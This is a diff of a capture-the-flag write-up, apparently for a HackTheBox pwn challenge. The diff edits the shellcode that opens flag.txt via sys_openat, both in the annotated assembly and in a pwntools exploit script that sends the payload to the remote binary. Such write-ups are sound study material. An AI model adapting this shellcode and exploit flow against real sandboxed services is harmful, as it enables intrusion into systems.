@@ -53,9 +53,9 @@ sudo seccomp-tools dump ./fleet_management
 ```asm
 xor rdx, rdx ; set rdi to 0
 push rdx ; push it to the stack
-mov rsi, 0x7478742e67616c66 ; stores flag.txt
-push rsi ; push it to the stack
-mov rsi, rsp ; move what's on the stack to rsi (set filename address to stack address) (need to mov from stack to rsi)
+mov rax, 0x7478742e67616c66 ; stores flag.txt
+push rax ; push it to the stack
+mov rsi, rsp ; move what's on the stack to rsi(set filename address to stack address)
 mov rdi, -100 ; set rdi as file descriptor (fd) pointing to AT_FDCWD
 mov rax, 257 ; do the sys_openat()
 syscall
@@ -90,8 +90,8 @@ sh.sendlineafter(b'do? ', b'9')
 shell = """
 xor rdx, rdx
 push rdx
-mov rsi, 0x7478742e67616c66
-push rsi
+mov rax, 0x7478742e67616c66
+push rax
 mov rsi, rsp
 mov rdi, -100
 mov rax, 257
@@ -112,7 +112,8 @@ sh.interactive()
 
 > RUN SCRIPT REMOTELY
 
-![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/327249f1-3d5f-41d6-8ab9-c2cf08fd5afd)
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/24937d66-919f-45fc-aeaa-c7c8b9928d23)
+
 
 12. Got the flag!
 
